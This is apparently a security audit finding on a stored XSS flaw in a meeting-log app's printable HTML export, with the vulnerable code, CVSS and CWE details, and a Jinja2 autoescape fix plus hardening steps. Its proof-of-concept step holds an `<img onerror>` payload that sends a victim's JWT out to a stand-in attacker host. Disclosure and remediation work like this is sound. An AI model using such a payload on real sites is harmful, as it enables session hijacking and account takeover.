# [Critical] Stored XSS in printable HTML export

**Severity:** 🔴 Critical (in the multi-member group threat model)
**CVSS v3.1 (estimated):** 8.0 — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L
**CWEs:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-116 (Improper Encoding or Escaping of Output)
**OWASP:** A03:2021 Injection, ASVS V5.3.3 / V5.3.4

## Summary

`backend/app/services.py:generate_printable_export` (lines ~1124–1210) assembles HTML with Python f-strings, interpolating user-controlled values with **no HTML escaping**:

```python
rows.append(
    f"<tr><td>{entry.meeting_date}</td>"
    f"<td>{entry.format_type}</td>"
    f"<td>{content}</td>"
    f"<td>{dana}</td></tr>"
)
...
return f"""<!DOCTYPE html>
<html><head><title>Meeting Log - {group.name}</title>...
<h1>{group.name}</h1>...
"""
```

The `{content}` value flows from `_get_entry_content` → `entry.speaker_name`, `Topic.name`, or `_get_book_chapter_summary` → `BookChapter.title`. Every one of those values is user-controlled:

- `group.name` — any authenticated user can write it via `PUT /api/settings/` (no RBAC; see [#12](./12-medium-no-rbac-or-admin-roles.md)).
- `speaker_name` — any authenticated user can set it via `POST /api/speakers/schedule` or `PUT /api/meetings/log/{id}`.
- `Topic.name` — any authenticated user can set it via `POST /api/topics/`.
- `BookChapter.title` — currently only settable via `seed.py`, but the column is plain `String(255)` with no write endpoint today — still indirectly reachable via direct DB access during debugging.

Because Recovery Dharma Log is designed to be **multi-user-per-group** (invite codes, joinable groups), an attacker who is a member of the victim's group (or who brute-forces an invite code per [#11](./11-medium-invite-code-abuse.md)) can plant a payload and wait for the victim to click "Printable View". The printable export is served as `text/html` on the same origin as the SPA, so an inline `<script>` runs with full access to the user's session (token in `localStorage` — see [#06](./06-high-token-storage-localstorage-xss.md)).

## Proof-of-concept

1. Alice and Mallory are both in Group 17 (Mallory joined with an invite code Alice generated).
2. Mallory: `POST /api/topics/` with `{"name": "<img src=x onerror=fetch('https://attacker.tld/?t='+localStorage.getItem('rd_log_token'))>"}`.
3. Mallory: `POST /api/topics/draw` so the topic is attached to a meeting log entry.
4. Alice: opens "Printable View" from `Log.tsx:88`. The malicious string is interpolated raw into a `<td>...</td>`. The `<img onerror>` fires. Alice's JWT is exfiltrated.
5. Mallory uses Alice's token until it expires (default 24h, see [#05](./05-high-jwt-design-weaknesses.md)). Mallory can also plant persistent payloads under Alice's name.

The same payload plugged into `group.name` lands inside the `<title>` and `<h1>` tags, bypassing any partial escaping of `<td>` content.

## Where

- `backend/app/services.py` — `_build_export_rows` (~line 1098), `_get_entry_content` (~line 1085), `generate_printable_export` (~line 1124).
- `backend/app/routers/export.py:33-45` — the router that returns the HTML with `media_type="text/html"`.
- `frontend/src/pages/Log.tsx:88` — the `<a target="_blank">` link users click.

## Recommended fix

Prefer a templating engine with **autoescape on by default** rather than sprinkling `html.escape` calls:

```python
# backend/app/services.py
from html import escape
from jinja2 import Environment, BaseLoader, select_autoescape

_PRINTABLE_TEMPLATE_SRC = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Meeting Log - {{ group.name }}</title>
...
</head>
<body>
<h1>{{ group.name }}</h1>
<hr class="header-rule">
{% if date_range %}<p class="date-range">{{ date_range }}</p>{% endif %}
<table>
  <thead><tr><th>Date</th><th>Format</th><th>Content</th><th>Dana</th></tr></thead>
  <tbody>
    {% for row in rows %}
      <tr><td>{{ row.date }}</td><td>{{ row.format }}</td><td>{{ row.content }}</td><td>{{ row.dana }}</td></tr>
    {% endfor %}
    {% for _ in range(blank_rows) %}
      <tr class="blank-row"><td>&nbsp;</td><td></td><td></td><td></td></tr>
    {% endfor %}
  </tbody>
</table>
<p class="footer">Generated from RD Log</p>
</body>
</html>"""

_env = Environment(
    loader=BaseLoader(),
    autoescape=select_autoescape(enabled_extensions=("html",), default=True),
)
_template = _env.from_string(_PRINTABLE_TEMPLATE_SRC)


def generate_printable_export(...):
    rows = [
        {
            "date": entry.meeting_date.isoformat(),
            "format": entry.format_type,
            "content": _get_entry_content(db, group, entry),
            "dana": f"${entry.dana_amount:.2f}" if entry.dana_amount is not None else "",
        }
        for entry in entries
    ]
    return _template.render(group=group, rows=rows, blank_rows=blank_rows,
                            date_range=_format_date_range(start_date, end_date))
```

### Additional hardening

1. **Serve downloads (not previews).** Add `Content-Disposition: attachment; filename="meeting_log_YYYYMMDD.html"` to force download and avoid rendering in the same origin browsing context.
2. **Content Security Policy.** Emit a per-response CSP on the export: `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src data:`. Any script tags in user input become dead weight.
3. **Reflected URL parameters.** `start_date`/`end_date` parse as `date` so they cannot carry HTML, but add a defence-in-depth test anyway.
4. **Server-side input caps.** Reject topic/speaker/group names longer than the underlying column (`String(255)` in `models.py`) with a 400, rather than relying on DB truncation.
5. **Pydantic validators** that reject control characters and strip leading/trailing whitespace for all name fields (see [#08](./08-high-weak-password-policy-bcrypt-truncation.md) for similar tightening).

## Acceptance criteria

- [ ] `curl /api/export/printable` with `group.name="<script>1</script>"` produces output where `<script>` appears as `&lt;script&gt;` in the HTML body and in the title.
- [ ] Unit tests added that assert HTML-escaped output for every interpolation point (group name, speaker name, topic name, chapter title, date_range).
- [ ] Export response sets a restrictive CSP header.
- [ ] Static analysis (bandit `B703` / manual rule) blocks `f"""...<...{var}...>"""` patterns in files that emit HTML.

## References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Jinja2 autoescape: https://jinja.palletsprojects.com/en/stable/api/#autoescaping
